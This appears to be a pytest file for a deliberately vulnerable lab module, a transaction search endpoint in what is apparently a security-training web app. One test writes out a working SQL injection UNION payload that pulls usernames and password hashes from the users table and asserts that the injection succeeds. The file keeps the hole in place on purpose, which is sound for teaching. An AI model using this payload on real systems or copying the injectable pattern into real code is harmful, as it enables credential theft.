"""
Coverage for modules/sqli_transaction_search. Runs against SQLite
(via TestConfig) for fast local regression -- the payload in
docs/README.md was separately verified against real Postgres 16
during development, since Postgres's strict UNION type-checking is
what actually matters for the live deployment.
"""
import pytest


@pytest.fixture
def app():
    from app import create_app, db
    from app.core.models import User
    from modules.sqli_transaction_search.models import Transaction
    from werkzeug.security import generate_password_hash
    from datetime import datetime

    application = create_app(config_object="config.TestConfig")
    application.config["TESTING"] = True

    with application.app_context():
        db.drop_all()
        db.create_all()
        db.session.add_all([
            User(id=1, username="attacker", email="attacker@test.local",
                 password_hash=generate_password_hash("Password123!"), role="customer"),
            User(id=3, username="admin", email="admin@test.local",
                 password_hash=generate_password_hash("ChangeMe_Admin!2024"), role="admin"),
        ])
        db.session.add_all([
            Transaction(customer_id=1, description="Grocery Store Purchase", amount=45.20, txn_date=datetime.utcnow()),
            Transaction(customer_id=1, description="Salary Deposit", amount=2500.00, txn_date=datetime.utcnow()),
            Transaction(customer_id=2, description="Rent Payment", amount=900.00, txn_date=datetime.utcnow()),
        ])
        db.session.commit()
        yield application


@pytest.fixture
def client(app):
    return app.test_client()


def _login(client):
    client.post("/login", data={"username": "attacker", "password": "Password123!"})


def test_search_returns_only_own_matching_transactions(client):
    _login(client)
    resp = client.get("/transactions/search?q=grocery")
    data = resp.get_json()
    assert len(data) == 1
    assert data[0]["description"] == "Grocery Store Purchase"


def test_search_does_not_leak_other_customers_transactions_normally(client):
    _login(client)
    resp = client.get("/transactions/search?q=rent")
    data = resp.get_json()
    assert data == []  # "Rent Payment" belongs to customer_id=2, not the logged-in attacker


def test_sqli_union_extracts_password_hashes(client):
    """THE VULNERABILITY. Locks in that the search endpoint can be
    used to exfiltrate arbitrary table contents via UNION."""
    _login(client)
    payload = "nonexistent%') UNION SELECT id, username || ':' || password_hash, 0, NULL FROM users -- "
    resp = client.get("/transactions/search", query_string={"q": payload})
    assert resp.status_code == 200
    data = resp.get_json()
    descriptions = [row["description"] for row in data]
    assert any("admin:" in d for d in descriptions)


def test_safe_list_endpoint_unaffected_by_injection_attempt(client):
    """Sibling endpoint uses the ORM -- confirms it's genuinely safe,
    not just untested."""
    _login(client)
    resp = client.get("/transactions")
    data = resp.get_json()
    assert len(data) == 2  # attacker's own 2 transactions only
